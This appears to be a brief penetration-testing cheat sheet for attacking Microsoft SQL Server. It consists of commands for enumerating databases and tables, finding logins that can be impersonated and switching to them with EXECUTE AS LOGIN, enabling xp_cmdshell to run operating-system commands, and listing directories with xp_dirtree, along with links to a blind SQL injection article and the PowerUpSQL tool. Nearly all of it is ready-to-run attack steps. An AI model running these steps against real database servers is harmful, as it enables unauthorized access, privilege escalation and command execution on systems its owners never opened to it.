### Commands
- enum_db
- 
- `SELECT @@version;`
- `SELECT name FROM sys.databases;` (to list all available db's)
	- master, tempdb, model, and msdb are default
- `SELECT * FROM $non-default-db.information_schema.tables;`
	- `select * from $non-default-db.dbo.$table;`

See if we can impersonate a user:
- `SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'`
If we can impersonate `$user-reader`:
- `EXECUTE AS LOGIN = '$user-reader'`
- `use $user`

### xp_cmdshell
1. `EXECUTE sp_configure 'show advanced options', 1;`
2. `RECONFIGURE;`
3. `EXECUTE sp_configure 'xp_cmdshell', 1;`
4. `RECONFIGURE;`
5. `EXECUTE xp_cmdshell 'whoami';`

### xp_dirtree
- `xp_dirtree C:\inetpub\wwwroot` for example 

### Brute forcing with ffuf
https://medium.com/@opabravo/manually-exploit-blind-sql-injection-with-ffuf-92881a199345

### Tools
- [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)

